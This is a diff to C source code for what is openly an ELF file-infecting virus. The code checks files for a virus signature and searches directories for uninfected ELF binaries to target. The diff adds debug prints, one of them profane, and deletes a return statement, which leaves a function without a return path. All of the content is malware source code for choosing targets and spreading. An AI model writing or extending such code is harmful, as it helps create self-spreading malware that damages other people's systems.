@@ -111,10 +111,17 @@ int verify_if_is_infected(char *file_name, char *virus_signature,int length_of_s
 
 		if(!strcmp(my_buffer,virus_signature))
 		{
+#ifdef DEBUGMODE
+			puts("True, it is already infected.");
+#endif
+
 			return true; // 'true'(=1) and 'false'(=0) given to you by the power of #include <stdbool.h> :)
 		}
 		else
 		{
+#ifdef DEBUGMODE
+			puts("False  it not infected.");
+#endif
 			return false;
 		}
 	}
@@ -178,21 +185,20 @@ char *search_for_target(char *path_to_target_directory, char *virus_file_name, c
 			}
 			else
 			{
-
+               puts("fuck ya");
 				if(!verify_if_is_infected(string_filename, virus_signature, length_of_signature) && verify_is_elf(string_filename) && !verify_is_original_file(string_filename, virus_file_name))		{
 					{
 						closedir(my_directory);
 
-#ifdef DEBUGMODE
+
 			printf("This file is not infected yet \t ---> %s  --> so I am going to infect it now.\n",string_filename);
-#endif
+
 						return(string_filename);
 					}
 				}
 			}
 			closedir(my_directory);
 		}
-		return NULL;
 	}
 }
 
